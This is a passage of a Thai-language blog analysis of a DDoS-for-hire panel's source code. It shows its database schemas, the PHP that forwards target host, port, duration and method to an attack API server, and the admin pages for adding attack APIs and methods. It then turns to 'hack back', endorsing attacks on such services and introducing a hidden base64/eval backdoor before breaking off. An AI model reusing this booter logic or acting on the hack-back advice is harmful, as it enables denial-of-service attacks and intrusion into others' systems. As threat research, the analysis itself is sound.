+  <span style="color:#f92672">`</span>unit<span style="color:#f92672">`</span> varchar(<span style="color:#ae81ff">10</span>) CHARACTER <span style="color:#66d9ef">SET</span> latin1 <span style="color:#66d9ef">COLLATE</span> latin1_swedish_ci <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span><span style="color:#66d9ef">length</span><span style="color:#f92672">`</span> int <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span>price<span style="color:#f92672">`</span> float <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span>con<span style="color:#f92672">`</span> varchar(<span style="color:#ae81ff">10</span>) CHARACTER <span style="color:#66d9ef">SET</span> latin1 <span style="color:#66d9ef">COLLATE</span> latin1_swedish_ci <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span>private<span style="color:#f92672">`</span> int <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span>api<span style="color:#f92672">`</span> int <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span>network<span style="color:#f92672">`</span> varchar(<span style="color:#ae81ff">11</span>) CHARACTER <span style="color:#66d9ef">SET</span> latin1 <span style="color:#66d9ef">COLLATE</span> latin1_swedish_ci <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#66d9ef">PRIMARY</span> <span style="color:#66d9ef">KEY</span> (<span style="color:#f92672">`</span>ID<span style="color:#f92672">`</span>) <span style="color:#66d9ef">USING</span> BTREE
+) ENGINE <span style="color:#f92672">=</span> MyISAM AUTO_INCREMENT <span style="color:#f92672">=</span> <span style="color:#ae81ff">19</span> CHARACTER <span style="color:#66d9ef">SET</span> <span style="color:#f92672">=</span> latin1 <span style="color:#66d9ef">COLLATE</span> <span style="color:#f92672">=</span> latin1_swedish_ci ROW_FORMAT <span style="color:#f92672">=</span> <span style="color:#66d9ef">Dynamic</span>;
+
+<span style="color:#75715e">-- ----------------------------
+</span><span style="color:#75715e">-- Table structure for users
+</span><span style="color:#75715e">-- ----------------------------
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">DROP</span> <span style="color:#66d9ef">TABLE</span> <span style="color:#66d9ef">IF</span> <span style="color:#66d9ef">EXISTS</span> <span style="color:#f92672">`</span>users<span style="color:#f92672">`</span>;
+<span style="color:#66d9ef">CREATE</span> <span style="color:#66d9ef">TABLE</span> <span style="color:#f92672">`</span>users<span style="color:#f92672">`</span>  (
+  <span style="color:#f92672">`</span>ID<span style="color:#f92672">`</span> int <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span> AUTO_INCREMENT,
+  <span style="color:#f92672">`</span>username<span style="color:#f92672">`</span> varchar(<span style="color:#ae81ff">15</span>) CHARACTER <span style="color:#66d9ef">SET</span> latin1 <span style="color:#66d9ef">COLLATE</span> latin1_swedish_ci <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span>password<span style="color:#f92672">`</span> varchar(<span style="color:#ae81ff">40</span>) CHARACTER <span style="color:#66d9ef">SET</span> latin1 <span style="color:#66d9ef">COLLATE</span> latin1_swedish_ci <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span>email<span style="color:#f92672">`</span> varchar(<span style="color:#ae81ff">50</span>) CHARACTER <span style="color:#66d9ef">SET</span> latin1 <span style="color:#66d9ef">COLLATE</span> latin1_swedish_ci <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span>uid<span style="color:#f92672">`</span> varchar(<span style="color:#ae81ff">20</span>) CHARACTER <span style="color:#66d9ef">SET</span> latin1 <span style="color:#66d9ef">COLLATE</span> latin1_swedish_ci <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span>rank<span style="color:#f92672">`</span> int <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span> <span style="color:#66d9ef">DEFAULT</span> <span style="color:#ae81ff">0</span>,
+  <span style="color:#f92672">`</span>membership<span style="color:#f92672">`</span> int <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span>expire<span style="color:#f92672">`</span> bigint <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span>status<span style="color:#f92672">`</span> int <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span>tokens<span style="color:#f92672">`</span> int <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span>last_active<span style="color:#f92672">`</span> int <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span>apikey<span style="color:#f92672">`</span> varchar(<span style="color:#ae81ff">50</span>) CHARACTER <span style="color:#66d9ef">SET</span> latin1 <span style="color:#66d9ef">COLLATE</span> latin1_swedish_ci <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span>apiip<span style="color:#f92672">`</span> varchar(<span style="color:#ae81ff">50</span>) CHARACTER <span style="color:#66d9ef">SET</span> latin1 <span style="color:#66d9ef">COLLATE</span> latin1_swedish_ci <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span>joined<span style="color:#f92672">`</span> int <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#66d9ef">PRIMARY</span> <span style="color:#66d9ef">KEY</span> (<span style="color:#f92672">`</span>ID<span style="color:#f92672">`</span>) <span style="color:#66d9ef">USING</span> BTREE,
+  <span style="color:#66d9ef">INDEX</span> <span style="color:#f92672">`</span>ID<span style="color:#f92672">`</span>(<span style="color:#f92672">`</span>ID<span style="color:#f92672">`</span>) <span style="color:#66d9ef">USING</span> BTREE
+) ENGINE <span style="color:#f92672">=</span> MyISAM AUTO_INCREMENT <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span> CHARACTER <span style="color:#66d9ef">SET</span> <span style="color:#f92672">=</span> latin1 <span style="color:#66d9ef">COLLATE</span> <span style="color:#f92672">=</span> latin1_swedish_ci ROW_FORMAT <span style="color:#f92672">=</span> <span style="color:#66d9ef">Dynamic</span>;
+</code></pre></div><p>ไฟล์ <code>stress.php</code> ซึ่งผู้ใช้บริการสามารถตั้งค่าเงื่อนไขการโจมตีได้นั้นมีเงื่อนไขการตรวจสอบที่ซับซ้อนก่อนที่การโจมตีจริงจะเกิดขึ้น นอกเหนือจากการตรวจสอบว่าผู้ใช้งานมีการซื้อบริการและมีรายละเอียดบริการที่สามารถใช้ได้อย่างไรบ้างแล้ว เมื่อผู้ใช้งานระบุเป้าหมายในการโจมตี ได้แก่ ระบบเป้าหมาย, พอร์ตของระบบเป้าหมาย, ระยะเวลาที่จะทำการโจมตี, วิธีการในการโจมตีและ Captcha ที่ถูกต้องแล้ว ไฟล์ <code>stress.php</code> จะมีการตรวจสอบเงื่อนไขว่าระบบที่ผู้ใช้งานกรอกเข้ามาอยู่ใน whitelist ของระบบ DDoSaaS หรือไม่ด้วย</p>
+<p>การตั้งค่าระบบ whitelist สามารถกำหนดได้ผ่าน <code>admin/editdw.php</code> หรือ <code>admin/dwhitelist.php</code> ได้</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$h = preg_replace(&#34;/(https?:\/\/)/is&#34;, &#34;&#34;, $host);
+$h = trim($h);
+$h = rtrim($h, &#34;/&#34;);
+$SQLCheckBlacklist = $odb-&gt;prepare(&#34;SELECT COUNT(*) FROM `blacklist` WHERE `IP` = :host&#34;);
+$SQLCheckBlacklist-&gt;execute(array(&#39;:host&#39; =&gt; $h));
+$countBlacklist = $SQLCheckBlacklist-&gt;fetchColumn(0);
+if ($countBlacklist &gt; 0) {
+	$notify = &#39;&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;col-md-12&#34;</span>&gt;&lt;<span style="color:#f92672">center</span>&gt;&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert alert-icon alert-danger alert-dismissible fade in&#34;</span> <span style="color:#a6e22e">role</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert&#34;</span>&gt;&lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;button&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;close&#34;</span> <span style="color:#a6e22e">data-dismiss</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert&#34;</span> <span style="color:#a6e22e">aria-label</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Close&#34;</span>&gt;&lt;<span style="color:#f92672">span</span> <span style="color:#a6e22e">aria-hidden</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;true&#34;</span>&gt;&amp;times;&lt;/<span style="color:#f92672">span</span>&gt;&lt;/<span style="color:#f92672">button</span>&gt;&lt;<span style="color:#f92672">i</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mdi mdi-check-all&#34;</span>&gt;&lt;/<span style="color:#f92672">i</span>&gt;IP is Whitelisted&lt;/<span style="color:#f92672">div</span>&gt;&lt;/<span style="color:#f92672">center</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;&#39;;
+</code></pre></div><p>หากเป้าหมายของผู้ใช้งานไม่อยู่ใน whitelist ของระบบ ไฟล์ <code>stress.php</code> จะทำการส่งข้อมูลของระบบเป้าหมายไปยังระบบซึ่งถูกเรียกว่า <strong>API server</strong> หรือระบบที่จะควบคุมและจัดการการโจมตีจริงผ่านฟังก์ชัน curl</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$SQLSelectAPI = $odb-&gt;query(&#34;SELECT * FROM `api` LIMIT 1&#34;);
+try {
+    foreach ($SQLSelectAPI as $row) {
+        $arrayFind = array(&#39;[host]&#39;, &#39;[port]&#39;, &#39;[time]&#39;, &#39;[method]&#39;);
+        $arrayReplace = array($host, $port, $time, $method);
+        $APILink = $row[&#39;api&#39;];
+        $APILink = str_replace($arrayFind, $arrayReplace, $APILink);
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $APILink);
+        curl_setopt($ch, CURLOPT_HEADER, 0);
+        curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
+        curl_exec($ch);
+        curl_close($ch);
+        sleep(3);
+    }
+} catch (Exception $e) {
+    $dbh = null;
+}
+</code></pre></div><p>เราจะสามารถสังเกตหน้าที่ของการเป็น frontend ของชุดซอร์สโค้ดนี้ได้เนื่องจากชุดซอร์สโค้ดนี้ไม่ได้มีการโจมตีระบบเป้าหมายด้วยตัวเอง หรือมีการติดต่อไปยังระบบที่จะทำการโจมตีจริงๆ ด้วยตัวเอง แต่ชุดซอร์สโค้ดนี้กลับส่งข้อมูลเป้าหมายไปให้กับระบบ API server เพื่อจัดสรรการโจมตีอีกครั้ง</p>
+<p>API server มีการแบ่งออกเป็น API server แบบปกติและ API server แบบ L7 โดยมีการเก็บข้อมูลแยกตารางกันในฐานข้อมูล ตามโครงสร้างตารางด้านล่าง</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#75715e">-- ----------------------------
+</span><span style="color:#75715e">-- Table structure for api
+</span><span style="color:#75715e">-- ----------------------------
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">DROP</span> <span style="color:#66d9ef">TABLE</span> <span style="color:#66d9ef">IF</span> <span style="color:#66d9ef">EXISTS</span> <span style="color:#f92672">`</span>api<span style="color:#f92672">`</span>;
+<span style="color:#66d9ef">CREATE</span> <span style="color:#66d9ef">TABLE</span> <span style="color:#f92672">`</span>api<span style="color:#f92672">`</span>  (
+  <span style="color:#f92672">`</span>ID<span style="color:#f92672">`</span> int <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span> AUTO_INCREMENT,
+  <span style="color:#f92672">`</span><span style="color:#66d9ef">handler</span><span style="color:#f92672">`</span> varchar(<span style="color:#ae81ff">50</span>) CHARACTER <span style="color:#66d9ef">SET</span> latin1 <span style="color:#66d9ef">COLLATE</span> latin1_swedish_ci <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span>api<span style="color:#f92672">`</span> varchar(<span style="color:#ae81ff">255</span>) CHARACTER <span style="color:#66d9ef">SET</span> latin1 <span style="color:#66d9ef">COLLATE</span> latin1_swedish_ci <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span>slots<span style="color:#f92672">`</span> int <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span>lastUsed<span style="color:#f92672">`</span> int <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span>active<span style="color:#f92672">`</span> int <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#66d9ef">PRIMARY</span> <span style="color:#66d9ef">KEY</span> (<span style="color:#f92672">`</span>ID<span style="color:#f92672">`</span>) <span style="color:#66d9ef">USING</span> BTREE
+) ENGINE <span style="color:#f92672">=</span> MyISAM AUTO_INCREMENT <span style="color:#f92672">=</span> <span style="color:#ae81ff">19</span> CHARACTER <span style="color:#66d9ef">SET</span> <span style="color:#f92672">=</span> latin1 <span style="color:#66d9ef">COLLATE</span> <span style="color:#f92672">=</span> latin1_swedish_ci ROW_FORMAT <span style="color:#f92672">=</span> <span style="color:#66d9ef">Dynamic</span>;
+
+<span style="color:#75715e">-- ----------------------------
+</span><span style="color:#75715e">-- Table structure for apil7
+</span><span style="color:#75715e">-- ----------------------------
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">DROP</span> <span style="color:#66d9ef">TABLE</span> <span style="color:#66d9ef">IF</span> <span style="color:#66d9ef">EXISTS</span> <span style="color:#f92672">`</span>apil7<span style="color:#f92672">`</span>;
+<span style="color:#66d9ef">CREATE</span> <span style="color:#66d9ef">TABLE</span> <span style="color:#f92672">`</span>apil7<span style="color:#f92672">`</span>  (
+  <span style="color:#f92672">`</span>ID<span style="color:#f92672">`</span> int <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span> AUTO_INCREMENT,
+  <span style="color:#f92672">`</span><span style="color:#66d9ef">handler</span><span style="color:#f92672">`</span> varchar(<span style="color:#ae81ff">50</span>) CHARACTER <span style="color:#66d9ef">SET</span> latin1 <span style="color:#66d9ef">COLLATE</span> latin1_swedish_ci <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span>api<span style="color:#f92672">`</span> varchar(<span style="color:#ae81ff">255</span>) CHARACTER <span style="color:#66d9ef">SET</span> latin1 <span style="color:#66d9ef">COLLATE</span> latin1_swedish_ci <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span>slots<span style="color:#f92672">`</span> int <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span>lastUsed<span style="color:#f92672">`</span> int <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#f92672">`</span>active<span style="color:#f92672">`</span> int <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+  <span style="color:#66d9ef">PRIMARY</span> <span style="color:#66d9ef">KEY</span> (<span style="color:#f92672">`</span>ID<span style="color:#f92672">`</span>) <span style="color:#66d9ef">USING</span> BTREE
+) ENGINE <span style="color:#f92672">=</span> MyISAM AUTO_INCREMENT <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span> CHARACTER <span style="color:#66d9ef">SET</span> <span style="color:#f92672">=</span> latin1 <span style="color:#66d9ef">COLLATE</span> <span style="color:#f92672">=</span> latin1_swedish_ci ROW_FORMAT <span style="color:#f92672">=</span> <span style="color:#66d9ef">Dynamic</span>;
+</code></pre></div><p>เนื่องจากผู้ดูแลระบบเป็นกลุ่มผู้ใช้งานเดียวที่สามารถกำหนดรายละเอียดของ API server จริงได้ หากเราเข้าไปดูที่ไฟล์ในกลุ่ม <code>admin/api.php</code> , <code>admin/apil7.php</code>  และ <code>admin/methods.php</code> เราจะเข้าใจการทำงานของสิ่งที่เรียกว่า API server มากยิ่งขึ้น</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;addBtn&#39;</span>])) {
+    $handler1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">htmlspecialchars</span>($_POST[<span style="color:#e6db74">&#39;handler&#39;</span>]);
+    $api2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">html_entity_decode</span>($_POST[<span style="color:#e6db74">&#39;api&#39;</span>], <span style="color:#a6e22e">ENT_QUOTES</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">ENT_HTML5</span>, <span style="color:#e6db74">&#39;UTF-8&#39;</span>);
+    $slots <span style="color:#f92672">=</span> <span style="color:#a6e22e">htmlspecialchars</span>($_POST[<span style="color:#e6db74">&#39;slots&#39;</span>]);
+
+    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">empty</span>($handler1) <span style="color:#f92672">||</span> <span style="color:#66d9ef">empty</span>($api2) <span style="color:#f92672">||</span> <span style="color:#66d9ef">empty</span>($slots)) {
+        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;div class=&#34;alert alert-icon alert-danger alert-dismissible fade in&#34; role=&#34;alert&#34;&gt;&lt;button type=&#34;button&#34; class=&#34;close&#34; data-dismiss=&#34;alert&#34; aria-label=&#34;Close&#34;&gt;&lt;span aria-hidden=&#34;true&#34;&gt;&amp;times;&lt;/span&gt;&lt;/button&gt;&lt;i class=&#34;mdi mdi-check-all&#34;&gt;&lt;/i&gt;Fill in all fields&lt;/div&gt;&#39;</span>;
+    } <span style="color:#66d9ef">else</span> {
+        $SQLinsert <span style="color:#f92672">=</span> $odb<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">&#34;INSERT INTO `api` VALUES(NULL, :handler, :api, :slots, UNIX_TIMESTAMP(NOW()), :active)&#34;</span>);
+        $SQLinsert<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">execute</span>(<span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;:handler&#39;</span> <span style="color:#f92672">=&gt;</span> $handler1, <span style="color:#e6db74">&#39;:api&#39;</span> <span style="color:#f92672">=&gt;</span> $api2, <span style="color:#e6db74">&#39;:slots&#39;</span> <span style="color:#f92672">=&gt;</span> $slots, <span style="color:#e6db74">&#39;:active&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">1</span>));
+        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;div class=&#34;alert alert-icon alert-success alert-dismissible fade in&#34; role=&#34;alert&#34;&gt;&lt;button type=&#34;button&#34; class=&#34;close&#34; data-dismiss=&#34;alert&#34; aria-label=&#34;Close&#34;&gt;&lt;span aria-hidden=&#34;true&#34;&gt;&amp;times;&lt;/span&gt;&lt;/button&gt;&lt;i class=&#34;mdi mdi-check-all&#34;&gt;&lt;/i&gt;API has been added!&lt;/div&gt;&#39;</span>;
+    }
+}
+<span style="color:#75715e">?&gt;</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">&lt;<span style="color:#f92672">p</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text-muted font-13 m-b-30&#34;</span>&gt;Add the methods you want your Stresser to have.. (Must be applicable with API)&lt;/<span style="color:#f92672">p</span>&gt;
+&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;col-md-7&#34;</span>&gt;
+&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">role</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span>&gt;
+<span style="color:#75715e">&lt;?php</span>
+<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;addMethod&#39;</span>])) {
+    $name <span style="color:#f92672">=</span> <span style="color:#a6e22e">htmlspecialchars</span>($_POST[<span style="color:#e6db74">&#39;name&#39;</span>]);
+    $friendly <span style="color:#f92672">=</span> <span style="color:#a6e22e">htmlspecialchars</span>($_POST[<span style="color:#e6db74">&#39;friendly&#39;</span>]);
+    $type <span style="color:#f92672">=</span> <span style="color:#a6e22e">htmlspecialchars</span>($_POST[<span style="color:#e6db74">&#39;type&#39;</span>]);
+
+    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">empty</span>($name) <span style="color:#f92672">||</span> <span style="color:#66d9ef">empty</span>($friendly)) {
+        $errors[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Please fill in all fields.&#39;</span>;
+    }
+    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">empty</span>($errors)) {
+        $insertMethod <span style="color:#f92672">=</span> $odb<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">&#34;INSERT INTO `methods` VALUES (NULL, :friendly, :name, UNIX_TIMESTAMP(), :type)&#34;</span>);
+        $insertMethod<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">execute</span>(<span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;:name&#39;</span> <span style="color:#f92672">=&gt;</span> $name, <span style="color:#e6db74">&#39;:friendly&#39;</span> <span style="color:#f92672">=&gt;</span> $friendly, <span style="color:#e6db74">&#39;:type&#39;</span> <span style="color:#f92672">=&gt;</span> $type));
+        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;div class=&#34;alert alert-icon alert-success alert-dismissible fade in&#34; role=&#34;alert&#34;&gt;&lt;button type=&#34;button&#34; class=&#34;close&#34; data-dismiss=&#34;alert&#34; aria-label=&#34;Close&#34;&gt;&lt;span aria-hidden=&#34;true&#34;&gt;&amp;times;&lt;/span&gt;&lt;/button&gt;&lt;i class=&#34;mdi mdi-check-all&#34;&gt;&lt;/i&gt;You have added a new method successfully!&lt;/div&gt;&#39;</span>;
+    } <span style="color:#66d9ef">else</span> {
+        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;div class=&#34;alert alert-danger&#34;&gt;&lt;a class=&#34;close&#34; data-dismiss=&#34;alert&#34; href=&#34;#&#34; aria-hidden=&#34;true&#34;&gt;×&lt;/a&gt;&lt;strong&gt;&lt;i class=&#34;mdi mdi-check-all&#34;&gt;&lt;/i&gt;Error has Occurred!&lt;/strong&gt;&lt;br /&gt;&#39;</span>;
+        <span style="color:#66d9ef">foreach</span> ($errors <span style="color:#66d9ef">as</span> $error) {
+            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">.</span> $error <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;&lt;br /&gt;&#39;</span>;
+        }
+        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;/div&gt;&#39;</span>;
+    }
+}
+<span style="color:#75715e">?&gt;</span>
+</code></pre></div><p>ในมุมของฝั่งป้องกัน การเข้าถึงฐานข้อมูลของบริการ DDoSaaS ได้จะทำให้การควบคุมและจัดการสามารถดำเนินการได้อย่างมีประสิทธิภาพมากขึ้น เนื่องจากฝั่งป้องกันสามารถทราบ API server endpoint ที่เป็นไปได้ทั้งหมด ซึ่งสามารถนำไปสู่การแกะรอยไปหาระบบที่จะทำการโจมตีจริงต่อ</p>
+<h1 id="hacking-the-platform">Hacking the Platform</h1>
+<p>ความเสี่ยงของการใช้ซอร์สโค้ดซึ่งถูกพัฒนาหรือเผยแพร่โดยแฮกเกอร์มักเป็นที่รู้กันอยู่แล้วในวงการ แฮกเกอร์ที่มีประสบการณ์มักตั้งใจสร้างความเสี่ยงหรือช่องโหว่เพื่อหลอกกลุ่มผู้ที่มีประสบการณ์ต่ำหรือกลุ่มที่มักจะเอาเครื่องมือไปใช้เพื่อโจมตีและเรียกตัวเองว่าเป็นแฮกเกอร์ ซึ่งเรามักจะรู้จักกันจากคำว่า Script kiddie ความเสี่ยงและช่องโหว่ที่ถูกตั้งใจสร้างไว้เหล่านี้จะทำให้ผู้พัฒนาหรือผู้ที่รู้การมีอยู่ของช่องโหว่สามารถหาความได้เปรียบหรือผลประโยชน์จากกลุ่มคนที่เอาเครื่องมือไปใช้โดยไม่อ่านซอร์สโค้ดเสมอ</p>
+<p>อย่างไรก็ตามในอีกมุมมองหนึ่ง การตั้งใจทำให้ระบบมีความเสี่ยงหรือช่องโหว่ก็สามารถถูกนำมาใช้ได้ตามแนวคิดของการ <strong>Hack back</strong></p>
+<p>แนวคิดของการ <a href="https://www.american.edu/sis/centers/security-technology/hack-back-toward-a-legal-framework-for-cyber-self-defense.cfm">Hack back</a> เมื่อถูกโจมตีเป็นแนวคิดที่ยังไม่ได้รับการยอมรับเท่าไหร่นักในวงการซึ่งผูกคุณลักษณะของการมีจริยธรรม (ethical) เอาไว้หน้าคำเรียก อย่างไรก็ตามหากมองในมุมของ Cyber warfare หรือ Cyber intelligence แล้วนั้น การ Hack back เป็นเพียงแค่หนึ่งในตัวเลือกของวิธีการในการ Counter attack หรือ Counter intelligence เพื่อขัดขวางหรือหยุดปฏิบัติการอันเป็นปฏิปักษ์ และมันเป็นตัวเลือกที่มีอาจฟังดูสมเหตุสมผลหากผลประโยชน์ที่เกิดขึ้นจากการทำสำเร็จนั้นมีมากกว่าผลเสีย</p>
+<p>เนื้อหาในส่วนต่อไปจะเป็นการพูดถึงความเสี่ยงและช่องโหว่ที่มีอยู่ในชุดซอร์สโค้ดนี้ ซึ่งสามารถนำไปใช้ในการโจมตีระบบ DDoSaaS ที่ใช้ชุดซอร์สโค้ดเดียวกันนี้ในการให้บริการได้ครับ เราขอข้ามการพูดถึงจุดมุ่งหมายในใช้ช่องโหว่เหล่านี้ไป และขอให้การเลือกดังกล่าวมาพร้อมกับความรับผิดชอบในการกระทำของผู้กระทำเองครับ</p>
+<h2 id="a-hidden-telemetry">A Hidden Telemetry</h2>
+<p>ในไฟล์ <code>includes/init.php</code> ซึ่งถูกเรียกใช้โดยหลายไฟล์ในชุดซอร์สโค้ดเพื่อแสดงข้อมูลทั่วไปของระบบมีการปรากฎของโค้ดในภาษา PHP ที่มีการเรียกใช้ฟังก์ชัน <code>base64_decode()</code> และฟังก์ชัน <code>eval()</code> กับก้อนข้อมูลที่ผ่านฟังก์ชัน <code>base64_encode()</code> มาตามตัวอย่างด้านล่าง</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$code = 